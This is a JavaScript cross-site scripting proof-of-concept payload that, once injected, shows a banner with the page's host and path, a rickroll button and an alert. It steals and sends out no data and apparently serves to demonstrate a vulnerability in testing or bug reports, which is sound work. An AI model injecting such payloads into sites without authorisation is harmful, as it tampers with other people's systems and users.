(() => {
  // Avoid spamming if the payload triggers multiple times
  if (window.__xss_poc_ran) return;
  window.__xss_poc_ran = true;

  // Small, obvious visual proof
  const wrap = document.createElement("div");
  wrap.id = "xss-poc-banner";
  wrap.style.cssText = `
    position: fixed; z-index: 2147483647;
    left: 16px; right: 16px; bottom: 16px;
    padding: 14px 16px;
    background: rgba(20,20,20,0.92);
    color: #fff; font: 14px/1.4 system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
    border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,.35);
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
  `;

  const left = document.createElement("div");
  left.innerHTML = `
    <div style="font-weight:700; font-size:15px;">✅ XSS PoC Executed</div>
    <div style="opacity:.9">Host: <b>${location.host}</b> &nbsp; Path: <b>${location.pathname}</b></div>
  `;

  const right = document.createElement("div");
  right.style.cssText = `display:flex; gap:10px; align-items:center;`;

  const btn = document.createElement("button");
  btn.textContent = "Rickroll me 🎵";
  btn.style.cssText = `
    border: 0; border-radius: 10px;
    padding: 10px 12px;
    background: #00d084; color: #051b14;
    font-weight: 700; cursor: pointer;
  `;
  btn.addEventListener("click", () => {
    // Autoplay audio is often blocked; opening the link is a safe, clear proof.
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank", "noopener,noreferrer");
  });

  const close = document.createElement("button");
  close.textContent = "Close";
  close.style.cssText = `
    border: 1px solid rgba(255,255,255,.25);
    border-radius: 10px;
    padding: 10px 12px;
    background: transparent; color: #fff;
    cursor: pointer;
  `;
  close.addEventListener("click", () => wrap.remove());

  right.append(btn, close);
  wrap.append(left, right);
  document.documentElement.appendChild(wrap);

  // Tiny alert too, if you want it super obvious (comment out if you dislike alerts)
  alert("XSS PoC executed (non-malicious). Never gonna give you up!");
})();
